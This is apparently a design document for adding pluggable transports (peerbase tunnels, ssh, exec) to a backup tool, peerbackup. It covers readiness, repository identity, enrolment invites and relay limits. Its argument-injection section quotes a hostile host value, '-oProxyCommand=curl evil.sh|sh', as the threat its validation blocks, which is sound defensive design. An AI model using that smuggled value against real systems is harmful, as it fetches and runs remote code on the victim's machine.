# Pluggable transports

Status: design, not implemented. Written against peerbase `a388db6`.

peerbackup today needs the host to forward a port. That rules out CGNAT and
anyone without router access, and it puts rest-server on the internet where
anyone can knock. This describes how to make the way a peer is reached a
choice rather than an assumption, without peerbackup learning any new
networking of its own.

## The observation the whole design rests on

Every candidate path ends in the same place: **restic speaks HTTP to a TCP
endpoint.** Port forwarding puts that endpoint on the internet. A peerbase
tunnel puts it on loopback. `ssh -L` and `cloudflared access tcp` do too.
Tailscale puts it on a tailnet address.

They differ only in how the endpoint comes to exist and how long it lives. So
the abstraction is not a transport that carries backup bytes. It is:

> Given a peer's descriptor, make it reachable, hand back a `rest:` URL restic
> can use, and tear down whatever was set up when the operation ends.

That is one small seam, and it is the same shape as `Invocation` in
`engine/restic.rs`: a resource that lives exactly as long as the child process.

## Not a backend

restic selects storage backends by URL scheme. This is not that, and conflating
them would be expensive.

restic's backends answer *where the bytes live*. Transports answer *how to reach
the one place they live*. peerbackup keeps the backend fixed at `rest:` in every
case, because rest-server is what supplies `--append-only`, `--private-repos`
and `--max-size` — the entire hosting security model. A transport swap must
never be able to discard append-only, which is the property stopping a
compromised client erasing its own backup history.

Same mechanism, one layer up. The URL's authority belongs to the transport; the
scheme, path and backend stay peerbackup's.

## One mechanism, shipped presets

peerbackup implements exactly one transport: supervise a subprocess, wait for a
port to listen, tear it down when the operation ends. `pb:` and `ssh:` are
default templates compiled in so nobody has to type them, and they resolve to
that same mechanism.

```toml
[transport.pb]
start    = ["peerbase", "tunnel", "connect", "--node-id", "{host}",
            "--stream", "restic", "--listen", "127.0.0.1:0"]
ready    = "stdout-addr"      # peerbase prints the bound address on stdout
recovery = "peerbase tunnel connect --node-id {host} --stream restic --listen 127.0.0.1:51515"

[transport.ssh]
start    = ["ssh", "-N", "-L", "{port}:127.0.0.1:8000", "--", "{host}"]
ready    = "listen"           # poll until {port} accepts
recovery = "ssh -N -L {port}:127.0.0.1:8000 -- {host}"
```

This splits along volatility. The *risky* part is process lifetime: spawn,
readiness, timeout, kill on drop, no leaked child when the operation panics.
That is real code, easy to get subtly wrong, and worth writing once — the review
found the deadline policy scattered across four call sites with one of them wrong
for as long as it existed. The *volatile* part is somebody else's CLI flags, and
those belong in data, so an upstream rename is a config edit rather than a
peerbackup release.

Shelling out rather than linking the peerbase SDK is the same decision the
project already made about restic, and for the same reasons. peerbackup's pitch
is one small static binary next to stock restic; peerbase's lockfile is 147 KB
against peerbackup's 10 KB. The seam means swapping to the library later is one
implementation, not a refactor.

### Reading the bound port

peerbase prints the bound address on stdout, which is what makes ephemeral ports
work (`cli/src/cmd_tunnel.rs:158`). `ssh -L` does not, so the `ssh` preset
allocates `{port}` on peerbackup's side and polls. Two readiness strategies,
declared per preset, no per-transport code.

## Three things that stay in code

These are peerbackup's semantics, not the transport's, and delegating any of
them breaks something the review fixed.

**Repository identity.** `repo_id` is `sha256(peer.url)` and it keys every
evidence record. Computed from the *dialled* URL, an ephemeral port would
produce a new identity every run, every record would look like a different
repository, and every peer would read `unchecked` forever. It must hash the
stable descriptor. This is the single easiest thing to get wrong here.

**Failure mapping.** A tunnel that will not start is `Unknown`, never `Bad`,
exactly like an unreachable peer today. Transport failure says nothing about
stored data and the three-state model depends on that line holding. The dial
failure and the peer-did-not-answer failure need distinct detail text, or
`status` collapses three causes into one word.

**Path policy.** A preset may *report* link quality; only peerbackup decides
what to do about it. See below.

## Argument injection

`{host}` comes from a pasted URL and lands in argv. A host of
`-oProxyCommand=curl evil.sh|sh` is argument injection with a friendly face —
the same class as the finding that put `--` before restic's positionals.

- `{host}` is substituted as a single argv element, never through a shell.
- `--` precedes it wherever the tool accepts one.
- The value is validated against a strict charset before it goes near a process.
- **An invite may only name a shipped preset.** A pasted URL must never be able
  to introduce a command. Anything user-defined is local config only.

## Reaching a peer through peerbase

peerbase `a388db6` added what this needs. Verified against the code, not the
changelog.

**The client needs no account.** `Dialer` has no control plane relationship at
all: no registration, no workspace, no API key, no heartbeat, no roster. A
keypair on disk and the host's node id, with iroh's own discovery turning that
into an address (`peerbase/src/dialer.rs:1-19`). `presets::N0` already brings
`PkarrPublisher`, `PkarrResolver` and `DnsAddressLookup`, so node id resolution
needs nothing of ours.

**The control plane is touched once, at setup.** `POST /enroll` is the only
unauthenticated write, and the secret is the credential, because a redeeming node
has no relationship yet. It is symmetric: the host learns the peer's node id by
pinning it, the peer learns the host's in the response
(`RedeemEnrollmentResponse { host_node_id, host_device_name, peer_alias }`). One
message each way instead of three. After enrolment the client never contacts the
control plane again.

**The host uses grants, not workspace membership.** `DeviceAccess` carries
`accepts_workspace_peers` alongside explicit `grants`. peerbackup sets the former
false, so a host accepts only the peers it granted. Alice's friends cannot reach
each other, which is the property the current pairwise model has and a shared
workspace would have destroyed.

**A control-plane outage does not stop backups.** `PeerRoster::resolve` falls
back to a stale roster of any age rather than refusing everyone while the control
plane is unreachable (`peerbase/src/peer_roster.rs`). One caveat: a host that
reboots with a cold cache while the control plane is down accepts nobody until it
returns. Worth documenting, not worth engineering around.

### The invite

The grant and the authorisation are the same act, so Alice runs peerbackup
commands and never learns a peerbase concept.

```
$ peerbackup host quickstart nisse --offer peerbase
Ready. Send all three to nisse, over something you trust:

  Control:  https://peerbase.example
  Enrol:    3f9c2a1b...            (256-bit, one use, expires in 1h)
  Password: nq7Y7PYN44nqKG83mNc9
```

The host node id is deliberately absent: the client learns it from the enrol
response. The enrolment secret rides the same message as the repository
password, so it adds no exposure — anyone who intercepts one has the other.

```
$ peerbackup connect --enrol 3f9c2a1b... --control https://peerbase.example \
    --source /srv/data
Password: ...
  enrolling... pinned as 'nisse', host is k51qzi5uqu5dh9ecked
  dialling... direct path, 1.4s
  repository created
  uploading a test file... uploaded (3f9c2a1b)
  downloading it again to check... matches
```

Config afterwards holds `pb://k51qzi5uqu5dh9ecked/nisse/`, and `repo_id` hashes
that, not the loopback port.

## The relay problem, which is not solved

peerbase added `--broker-only`, backed by `iroh-relay`'s `Limits::client_rx`,
defaulting to 32 KB/s sustained with a 256 KB burst. That is the right control:
the operator paying for bandwidth sets the policy, a burst covers the QUIC
handshake and the hole-punch window, and a sustained trickle makes bulk transfer
pointless. It is enforced server-side and the client is told via
`Status::RateLimited`.

**But peerbase flagged the consequence and it lands on us.** Broker-only turns
slow into broken for any pair that never finds a direct path, and symmetric NAT
at both ends is exactly that case — part of the CGNAT population this whole
integration was meant to serve. Not all CGNAT prevents hole punching, but some
does, and for those pairs peerbase is not an answer at all.

So peerbackup needs three states, not two:

| Path | First seed | Incrementals |
|---|---|---|
| Direct | proceed | proceed |
| Relayed, relay carries data | refuse, `--allow-relay` to override | proceed |
| Relayed, broker-only | refuse; it cannot work | refuse; it cannot work |

The third row must be detected at `connect` time, not at 3am during a backup,
and the message has to say the real thing: this pair cannot reach each other
directly, and the options are a relay that carries data, a forwardable port on
one side, or a different transport. A rate-limited relay otherwise presents as a
stalled transfer.

This is the one place the integration does not deliver what the FR hoped for, and
the docs must not claim otherwise.

## Host key loss

Guest key loss is cheap: reopening an enrolment slot rebinds the existing grant,
so a peer who reinstalled keeps its alias.

Host key loss is not. Every peer must be re-invited, N messages instead of one,
and it takes the grant list with it if the control plane shares the storage
machine. The mitigation is free and belongs in the docs: **do not co-locate the
control plane with the storage it authorises.**

## Which transports, and why that set

- **`rest:` — direct.** Exists. Port forwarding, reverse proxies, VPNs, LAN,
  Tailscale, anything with a routable address. Zero new code; it becomes the
  identity transport.
- **`pb:` — peerbase.** Covers no-router-access and the hole-punchable part of
  CGNAT. Not the symmetric-NAT-both-ends case, see above.
- **`ssh:`.** Nearly universal, already installed, already configured in
  `~/.ssh/config`, and the host key model is one people understand. Covers
  anyone with a shell account somewhere.
- **A local-only `exec:`.** Config file only, never from an invite. Covers
  `cloudflared`, WireGuard helpers, corporate jump hosts, and whatever someone
  invents, without peerbackup knowing they exist.

Three shipped and one escape hatch. The set is open without being infinite,
which is the same answer restic reached with `rclone:`.

## Testing

A `FakeTransport` for the paths that are awkward with a network: dial timeout,
child that exits immediately, child that never listens, teardown on panic, and
the relayed-path refusal. `FakeEngine` caught real defects during the review —
including, embarrassingly, one in a change of mine where the fake used a single
id for both restic's full and short forms and hid a comparison that could never
match. A fake that is too convenient is worse than none.

## Open questions

1. Does `peerbackup connect` take `--enrol`/`--control` as flags, or should the
   invite be one pasteable URI that encodes all three? One string is easier to
   send; three flags are easier to read in a terminal and harder to typo.
2. Should `pb:` peers skip the HTTP basic-auth password entirely? rest-server
   still wants one, and defence in depth argues for keeping it, but it is a
   second secret to carry in an invite that already has two.
3. Detecting broker-only versus a permissive relay before committing to a first
   seed. `Status::RateLimited` arrives once throughput is attempted, which may be
   too late to be graceful.
4. peerbase's relay still defaults to `AllowAll`. Anyone self-hosting one for
   peerbackup is running an open relay, which matters more for a public consumer
   relay than for two friends.
